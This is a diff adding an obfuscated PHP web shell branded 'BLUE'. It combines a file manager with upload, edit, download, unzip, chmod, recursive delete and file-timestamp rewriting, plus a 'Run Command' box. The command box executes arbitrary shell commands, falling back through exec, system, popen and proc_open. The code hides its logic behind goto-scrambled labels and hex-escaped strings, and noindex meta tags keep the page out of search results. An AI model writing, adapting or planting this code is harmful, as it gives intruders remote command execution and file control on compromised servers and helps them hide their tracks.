@@ -1,0 +1,972 @@
+<?php
+ goto s26Fl; Jod8w: if (!empty($_SESSION["\x6d\x73\147"])) { ?>
+        <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
+          <?php  echo h($_SESSION["\x6d\x73\147"]); unset($_SESSION["\155\x73\147"]); ?>
+        </div>
+      <?php  } goto atD4M; T44g7: if (!function_exists("\x66\x78\137\x70\162\157\143\x5f\157\160\145\x6e")) { function fx_proc_open($cmd, $descriptorspec, &$pipes, $cwd = null, $env = null) { if (is_fn_usable("\x70\x72\x6f\x63\137\x6f\160\145\156")) { return @proc_open($cmd, $descriptorspec, $pipes, $cwd, $env); } return false; } } goto eCX9G; HBaGf: echo h(PHP_VERSION); goto aDdkA; rEcPm: if (!function_exists("\162\165\x6e\x5f\167\x69\164\x68\137\x70\x6f\160\145\x6e")) { function run_with_popen($cmd, $cwd = null) { if (!is_fn_usable("\x70\x6f\x70\x65\156")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\40\62\x3e\x26\x31"; $h = @popen(wrap_cmd_for_shell($full), "\x72"); if (!is_resource($h)) { return null; } $buf = ''; while (!feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) { break; } $buf .= $chunk; } @pclose($h); return array("\x6d\145\x74\150\x6f\144" => "\x70\157\160\x65\x6e", "\143\x6f\144\145" => null, "\157\165\x74" => $buf); } } goto qwc4i; LRyaB: echo rawurlencode($current); goto jDaqy; H8UJZ: ?>
+</div>
+        </div>
+        <form method="post" action="?a=mass-delete&p=<?php  goto NAXDH; UPzwe: ?>
+<!doctype html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="utf-8">
+  <title>BLUE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = { darkMode:'class', theme:{ extend:{
+      fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
+      colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
+      boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
+      borderRadius:{ xl2:'18px' }
+    } } }
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">
+
+  <!-- CodeMirror 5 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
+  <style>
+    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
+    .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }
+
+    html,body{height:100%}
+    body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
+    .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
+    .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
+    .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
+    .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
+    .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
+    .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
+    .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
+    .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
+    .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
+    .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
+    .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
+    .tbl tbody tr.hoverable{transition:background .15s ease}
+    .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
+    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
+    .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
+    .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
+    @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
+    .tablewrap{height:calc(100vh - 320px);overflow:auto}
+    @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
+    .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
+    .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
+    /*#tableCard{ min-height: calc(100vh - 260px); }*/
+
+    /* Command editors */
+    .cm-cmd-input { font-size:13px; line-height:1.45; }
+    .cm-cmd-input .CodeMirror { width:100% !important; }
+    .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
+    .cm-cmd-input .CodeMirror { height:36px !important; }
+    .cm-cmd-output { font-size:14px; line-height:1.5; }
+    .cm-cmd-output .CodeMirror { width:100% !important; }
+    .cm-cmd-output .CodeMirror-scroll { height:380px !important; }
+
+    /* Lebar command dibatasi agar tidak terlalu panjang */
+    .cmd-container{ max-width:600px; width:100%; }
+    @media (min-width:1536px){ .cmd-container{ max-width:680px; } }
+
+    /* Make table copy-friendly */
+    #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }
+
+    /* Force ALL links inside the directory table to be white */
+    #dirTable a, #dirTable a:visited { color:#ffffff !important; }
+
+    /* Footer gradient line */
+    .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}
+
+    /* Placeholder abu untuk CodeMirror command */
+    .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
+      color:#94a3b8; /* slate-400 */
+      opacity:.95;
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
+</head>
+<body class="shell text-slate-100" id="bodyRoot">
+  <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
+    <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
+      <div class="flex items-center gap-3 shrink-0">
+        <div class="text-2xl"><?php  goto ngb8J; xfxG4: if (!function_exists("\x72\165\x6e\137\x77\x69\164\150\x5f\145\x78\145\x63")) { function run_with_exec($cmd, $cwd = null) { if (!is_fn_usable("\x65\170\x65\x63")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\40\62\76\x26\x31"; $lines = array(); $code = 0; @exec($full, $lines, $code); return array("\155\x65\x74\x68\157\x64" => "\145\170\145\x63", "\143\157\x64\x65" => $code, "\157\x75\x74" => implode("\xa", (array) $lines)); } } goto NCo3o; Npyoo: if ($hasNatural) { sort($dirs, $hasFlagCase ? SORT_NATURAL | SORT_FLAG_CASE : SORT_NATURAL); sort($files, $hasFlagCase ? SORT_NATURAL | SORT_FLAG_CASE : SORT_NATURAL); } else { natcasesort($dirs); $dirs = array_values($dirs); natcasesort($files); $files = array_values($files); } goto ZFW1e; yUSv4: if (!function_exists("\162\x75\x6e\137\x77\x69\x74\x68\x5f\x70\x72\x6f\x63\x5f\157\x70\145\156")) { function run_with_proc_open($cmd, $cwd = null, $timeout = 30) { if (!is_fn_usable("\160\x72\x6f\143\137\157\160\145\x6e")) { return null; } $des = array(0 => array("\x70\x69\x70\145", "\162"), 1 => array("\160\151\x70\x65", "\167"), 2 => array("\x70\x69\x70\x65", "\x77")); $pipes = array(); $proc = @proc_open($cmd, $des, $pipes, $cwd ?: null, null); if (!is_resource($proc)) { return null; } if (isset($pipes[1]) && is_resource($pipes[1])) { @stream_set_blocking($pipes[1], false); } if (isset($pipes[2]) && is_resource($pipes[2])) { @stream_set_blocking($pipes[2], false); } if (isset($pipes[0]) && is_resource($pipes[0])) { @fclose($pipes[0]); } $buf = ''; $start = time(); while (true) { $status = @proc_get_status($proc); $running = $status && !empty($status["\x72\165\x6e\x6e\x69\156\x67"]); $r = array(); if (isset($pipes[1]) && is_resource($pipes[1])) { $r[] = $pipes[1]; } if (isset($pipes[2]) && is_resource($pipes[2])) { $r[] = $pipes[2]; } if ($r) { $w = null; $e = null; @stream_select($r, $w, $e, 1); foreach ($r as $p) { $chunk = @fread($p, 8192); if ($chunk !== false && $chunk !== '') { $buf .= $chunk; } } } else { usleep(100000); } if (!$running) { break; } if ($timeout > 0 && time() - $start >= $timeout) { @proc_terminate($proc, 9); foreach ($pipes as $p) { if (is_resource($p)) { @fclose($p); } } @proc_close($proc); return array("\155\145\164\x68\157\x64" => "\160\162\157\143\137\x6f\160\x65\156", "\143\x6f\x64\145" => 124, "\x6f\x75\x74" => $buf . "\xa\x5b\164\151\x6d\x65\x6f\x75\x74\x20\141\x66\164\x65\x72\x20{$timeout}\x73\135"); } } foreach ($pipes as $p) { if (is_resource($p)) { @fclose($p); } } $code = @proc_close($proc); if ($code === -1) { $code = null; } return array("\155\x65\164\150\x6f\144" => "\x70\162\157\x63\137\x6f\x70\145\156", "\143\157\144\145" => $code, "\x6f\165\164" => $buf); } } goto Ed6bp; xiFy2: echo je(DIRECTORY_SEPARATOR === "\x5c"); goto k_9yJ; KiYAP: foreach ($dirs as $name) { $full = $current . DIRECTORY_SEPARATOR . $name; $r = @is_readable($full); $w = @is_writable($full); $permColorClass = $w ? "\164\x65\x78\x74\55\154\x69\155\x65\55\x34\x30\x30" : ($r ? "\164\x65\170\x74\x2d\167\x68\151\164\145" : "\164\x65\170\x74\55\162\145\144\x2d\64\60\60"); ?>
+                  <tr class="border-b border-slate-800 hoverable"
+                      data-type="dir"
+                      data-name="<?php  echo h(strtolower($name)); ?>
+"
+                      data-size="0"
+                      data-mtime="<?php  echo (int) @filemtime($full); ?>
+"
+                      draggable="true"
+                      ondragstart="onDragStartItem(event, <?php  echo je($name); ?>
+)"
+                      ondragover="onDragOverDir(event)"
+                      ondragleave="onDragLeaveDir(event)"
+                      ondrop="onDropToDir(event, <?php  echo je($name); ?>
+)">
+                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php  echo h($name); ?>
+"></td>
+                    <td class="py-2 px-2">
+                      <div class="flex items-center gap-2 <?php  echo $permColorClass; ?>
+">
+                        <?php  echo iconSvgFor($full); ?>
+                        <a class="hover:underline font-medium text-white"
+                           draggable="false"
+                           onclick="return guardLinkCopy(event)"
+                           href="?p=<?php  echo rawurlencode($full); ?>
+"><?php  echo h($name); ?>
+</a>
+                        <span class="badge-small">DIR</span>
+                      </div>
+                    </td>
+                    <td class="py-2 px-2">-</td>
+                    <td class="py-2 px-2 mono <?php  echo $permColorClass; ?>
+"><?php  echo h(permsToString($full)); ?>
+</td>
+                    <td class="py-2 px-2"><?php  echo h(date("\131\x2d\155\x2d\x64\x20\110\x3a\151\x3a\x73", @filemtime($full) ?: time())); ?>
+</td>
+                    <td class="py-2 px-2">
+                      <div class="row-actions">
+                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
+                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>
+
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php  echo h($name); ?>
+')">Rename</button>
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php  echo h($name); ?>
+')">Chmod</button>
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php  echo h($name); ?>
+')">Change Date</button>
+
+                        <form method="post" action="?a=delete&p=<?php  echo rawurlencode($current); ?>
+" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <button class="btn btn-xs btnw" type="submit">Delete</button>
+                        </form>
+                      </div>
+
+                      <div id="rn-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=rename&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="old" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="new" class="field w-48" placeholder="New name">
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+
+                      <div id="cm-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=chmod&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2 items-center">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
+                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+
+                      <div id="mt-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=mtime&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2 items-center">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
+                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+                    </td>
+                  </tr>
+                <?php  } goto BO4BT; OJZm1: echo h($csrf); goto hkfIk; LAXCA: ?>
+;
+    var currentPath = <?php  goto SsBbg; lcMpQ: if (empty($dirs) && empty($files)) { ?>
+                  <tr><td colspan="6" class="py-6 text-center text-slate-400">Empty</td></tr>
+                <?php  } goto ViiAq; yo4C6: function isTextFile($p) { if (is_dir($p) || !is_file($p)) { return false; } $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION)); $text = array("\x74\170\164", "\155\144", "\152\163\157\156", "\x6a\x73", "\164\x73", "\143\163\x73", "\163\143\163\x73", "\154\145\x73\x73", "\150\164\155\x6c", "\x68\x74\155", "\x78\x6d\154", "\163\x76\x67", "\160\x68\160", "\x70\x68\x74\155\154", "\151\156\x63", "\x69\156\x69", "\x63\x66\147", "\145\x6e\166", "\171\x6d\x6c", "\x79\141\155\154", "\160\x79", "\162\x62", "\x67\157", "\162\163", "\x63", "\150", "\x63\x70\x70", "\x68\160\160", "\x6a\141\x76\141", "\153\x74", "\163\161\154", "\143\163\x76", "\154\157\x67"); if (in_array($ext, $text, true)) { return true; } $s = @file_get_contents($p, false, null, 0, 2048); if ($s === false) { return false; } return (bool) preg_match("\x2f\x2f\x75", $s); } goto Mv1SJ; tA23m: ?>
+" class="space-y-2">
+            <input type="hidden" name="csrf" value="<?php  goto xwnlD; AKoZa: header("\120\162\141\x67\155\141\x3a\x20\156\x6f\x2d\143\x61\x63\x68\145"); goto EzkO_; hCHHP: ?>
+">
+          <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
+          <button class="btn btn-sm shrink-0" type="submit">Run</button>
+        </form>
+      </div>
+
+      <form method="post" action="?a=logout&p=<?php  goto DR40G; wkd_A: ?>
+;
+      var cmdMode = isWin ? 'powershell' : 'shell';
+
+      var cmCmd = CodeMirror.fromTextArea(ta, {
+        lineNumbers: false,
+        styleActiveLine: true,
+        matchBrackets: true,
+        autoCloseBrackets: true,
+        lineWrapping: false,
+        theme: 'material-darker',
+        mode: cmdMode,
+        viewportMargin: Infinity,
+        placeholder: 'Run Command'
+      });
+
+      CodeMirror.autoLoadMode(cmCmd, cmdMode);
+      cmCmd.setSize('100%', 36);
+      cmCmd.getWrapperElement().classList.add('cm-cmd-input');
+
+      cmCmd.on('beforeChange', function(cm, change){
+        var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
+        if (hasNewline) change.update(change.from, change.to, [' ']);
+      });
+
+      cmCmd.on('keydown', function(cm, e){
+        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+          e.preventDefault();
+          var form = document.getElementById('cmdForm');
+          if (form) form.submit();
+        }
+      });
+
+      var form = document.getElementById('cmdForm');
+      if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }
+
+      setTimeout(function(){ cmCmd.refresh(); }, 50);
+      window.addEventListener('resize', function(){ cmCmd.refresh(); });
+    })();
+
+    // ===== CodeMirror untuk COMMAND OUTPUT =====
+    (function(){
+      var pre = document.getElementById('cmdOutPre');
+      if(!pre || typeof CodeMirror === 'undefined') return;
+
+      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
+      var isWin = <?php  goto xiFy2; ovZqS: $modeParam = isset($_GET["\x6d\x6f\x64\145"]) ? $_GET["\155\157\144\145"] : "\141\165\x74\x6f"; goto f9SS_; QaFL3: echo h($csrf); goto nVTP6; wpiHf: function tryWriteFromTmp($tmp, $dest) { $err = array(); if (@move_uploaded_file($tmp, $dest)) { return array(true, null); } $err[] = "\155\x6f\166\x65\137\x75\x70\154\x6f\141\x64\x65\x64\137\146\151\154\145"; if (@rename($tmp, $dest)) { return array(true, null); } $err[] = "\162\145\x6e\141\155\x65"; if (@copy($tmp, $dest)) { return array(true, null); } $err[] = "\x63\157\160\x79"; $d = @file_get_contents($tmp); if ($d !== false && @file_put_contents($dest, $d) !== false) { return array(true, null); } $err[] = "\147\x65\164\x2b\x70\x75\164"; $in = @fopen($tmp, "\x72\142"); $out = @fopen($dest, "\167\x62"); if ($in && $out) { $c = stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) { return array(true, null); } $err[] = "\x73\164\x72\145\x61\x6d\x5f\143\157\x70\x79"; } else { $err[] = "\x66\x6f\160\145\156"; } return array(false, implode("\x3b\40", $err) . "\x20\146\x61\x69\x6c\145\144"); } goto ErjoT; A1PnK: if (!function_exists("\146\x78\x5f\x70\157\163\151\170\x5f\x67\145\x74\x70\x77\165\x69\144")) { function fx_posix_getpwuid($uid) { if (is_fn_usable("\160\157\x73\x69\170\x5f\x67\145\164\160\x77\165\x69\x64")) { return @posix_getpwuid($uid); } return array("\156\141\155\x65" => @get_current_user(), "\x75\151\144" => $uid); } } goto gCvZv; mqtcV: echo $yearNow; goto NG8Ns; NCo3o: if (!function_exists("\162\x75\x6e\137\167\151\x74\150\137\163\171\x73\164\145\155")) { function run_with_system($cmd, $cwd = null) { if (!is_fn_usable("\163\171\x73\164\145\x6d")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\40\x32\x3e\46\61"; ob_start(); @system($full, $code); $out = ob_get_clean(); return array("\155\x65\164\x68\157\144" => "\163\171\x73\164\x65\x6d", "\x63\x6f\x64\x65" => $code, "\x6f\x75\x74" => $out); } } goto rEcPm; Pl1Ri: ?>
+;
+
+    ['dragenter','dragover'].forEach(function(ev){
+      document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
+    });
+    ['dragleave','drop'].forEach(function(ev){
+      document.addEventListener(ev, function(e){
+        if(ev==='dragleave' && e.target !== document) return;
+        tableCard.classList.remove('drop-hint');
+      });
+    });
+    document.addEventListener('drop', function(e){
+      if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
+      e.preventDefault(); e.stopPropagation();
+      try{
+        var fd = new FormData();
+        fd.append('csrf', csrf);
+        for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
+        fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
+          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
+          .catch(function(){ alert('Upload failed'); });
+      }catch(err){ console.error(err); alert('Upload failed'); }
+    });
+
+    // ===== Drag to Move between directories (copy-friendly by default) =====
+    var draggedItemName = null;
+    var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy
+
+    // Toggle handler
+    (function(){
+      var dt = document.getElementById('dragToggle');
+      if (dt) {
+        dragEnabled = !!dt.checked;
+        dt.addEventListener('change', function(){
+          dragEnabled = !!dt.checked;
+        });
+      }
+    })();
+
+    function onDragStartItem(ev, name){
+      if (!dragEnabled) {
+        ev.preventDefault();
+        return false;
+      }
+      draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
+      ev.dataTransfer.effectAllowed = 'move';
+    }
+    function onDragOverDir(ev){
+      if (!dragEnabled) return;
+      ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
+      ev.dataTransfer.dropEffect = 'move';
+    }
+    function onDragLeaveDir(ev){
+      ev.currentTarget.classList.remove('droptarget');
+    }
+    function onDropToDir(ev, dirName){
+      if (!dragEnabled) return;
+      ev.preventDefault();
+      var row = ev.currentTarget; row.classList.remove('droptarget');
+      var src = draggedItemName || ev.dataTransfer.getData('text/plain');
+      if(!src) return;
+      try{
+        var fd = new FormData();
+        fd.append('csrf', csrf);
+        fd.append('src', src);
+        var dstAbs = <?php  goto FRzj3; tP2Ju: header("\130\x2d\106\162\x61\155\x65\x2d\117\x70\x74\x69\157\156\x73\x3a\x20\104\105\116\131"); goto wIizJ; JDFFC: ?>
+" class="space-y-2">
+          <input type="hidden" name="csrf" value="<?php  goto OJZm1; hkfIk: ?>
+">
+          <label class="text-sm text-slate-300">New Folder</label>
+          <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
+          <button class="btn w-full" type="submit">Create Folder</button>
+        </form>
+      </section>
+
+      <section class="card p-4">
+        <h2 class="font-medium mb-3">Upload</h2>
+        <div class="grid grid-cols-1 gap-4">
+          <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php  goto I5dMY; Hx5jU: foreach ($files as $name) { $full = $current . DIRECTORY_SEPARATOR . $name; $size = (int) @filesize($full); $mtime = (int) @filemtime($full); $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION)); $r = @is_readable($full); $w = @is_writable($full); $permColorClass = $w ? "\164\145\x78\164\55\x6c\x69\x6d\x65\x2d\64\x30\x30" : ($r ? "\164\145\x78\x74\55\167\x68\151\164\x65" : "\164\x65\170\164\x2d\162\x65\x64\x2d\64\60\x30"); ?>
+                  <tr class="border-b border-slate-800 hoverable"
+                      data-type="file"
+                      data-name="<?php  echo h(strtolower($name)); ?>
+"
+                      data-size="<?php  echo $size; ?>
+"
+                      data-mtime="<?php  echo $mtime; ?>
+"
+                      draggable="true"
+                      ondragstart="onDragStartItem(event, <?php  echo je($name); ?>
+)">
+                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php  echo h($name); ?>
+"></td>
+                    <td class="py-2 px-2">
+                      <div class="flex items-center gap-2 <?php  echo $permColorClass; ?>
+">
+                        <?php  echo iconSvgFor($full); ?>
+                        <a class="font-medium hover:underline text-white"
+                           draggable="false"
+                           onclick="return guardLinkCopy(event)"
+                           href="?a=view&f=<?php  echo rawurlencode($name); ?>
+&p=<?php  echo rawurlencode($current); ?>
+">
+                          <?php  echo h($name); ?>
+                        </a>
+                      </div>
+                    </td>
+                    <td class="py-2 px-2 mono"><?php  echo h(humanSize($size)); ?>
+</td>
+                    <td class="py-2 px-2 mono <?php  echo $permColorClass; ?>
+"><?php  echo h(permsToString($full)); ?>
+</td>
+                    <td class="py-2 px-2"><?php  echo h(date("\131\55\155\55\x64\x20\110\72\151\x3a\x73", $mtime ?: time())); ?>
+</td>
+                    <td class="py-2 px-2">
+                      <div class="row-actions">
+                        <a class="btn btn-xs btnw" href="?a=edit&f=<?php  echo rawurlencode($name); ?>
+&p=<?php  echo rawurlencode($current); ?>
+">Edit</a>
+                        <a class="btn btn-xs btnw" href="?a=download&f=<?php  echo rawurlencode($name); ?>
+&p=<?php  echo rawurlencode($current); ?>
+">Download</a>
+
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php  echo h($name); ?>
+')">Rename</button>
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php  echo h($name); ?>
+')">Chmod</button>
+                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php  echo h($name); ?>
+')">Change Date</button>
+
+                        <?php  if (in_array($ext, array("\x7a\151\160")) || preg_match("\x7e\134\x2e\x28\x74\x61\162\174\x74\x61\162\x5c\56\147\172\x7c\164\x61\x72\x5c\56\x62\172\62\174\164\x61\x72\134\56\170\x7a\51\x24\x7e\151", $name)) { ?>
+                          <form method="post" action="?a=unzip&p=<?php  echo rawurlencode($current); ?>
+" class="inline">
+                            <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                            <input type="hidden" name="file" value="<?php  echo h($name); ?>
+">
+                            <button class="btn btn-xs btnw" type="submit">Unzip here</button>
+                          </form>
+                        <?php  } ?>
+
+                        <form method="post" action="?a=delete&p=<?php  echo rawurlencode($current); ?>
+" class="inline" onsubmit="return confirm('Delete this file?')">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <button class="btn btn-xs btnw" type="submit">Delete</button>
+                        </form>
+                      </div>
+
+                      <div id="rn-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=rename&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2 mt-1">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="old" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="new" class="field w-48" placeholder="New name">
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+
+                      <div id="cm-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=chmod&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2 items-center mt-1">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
+                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+
+                      <div id="mt-<?php  echo h($name); ?>
+" class="hidden mt-2">
+                        <form method="post" action="?a=mtime&p=<?php  echo rawurlencode($current); ?>
+" class="flex flex-wrap gap-2 items-center">
+                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
+">
+                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
+                          <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
+                          <button class="btn btn-sm btnw" type="submit">OK</button>
+                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
+                        </form>
+                      </div>
+
+                    </td>
+                  </tr>
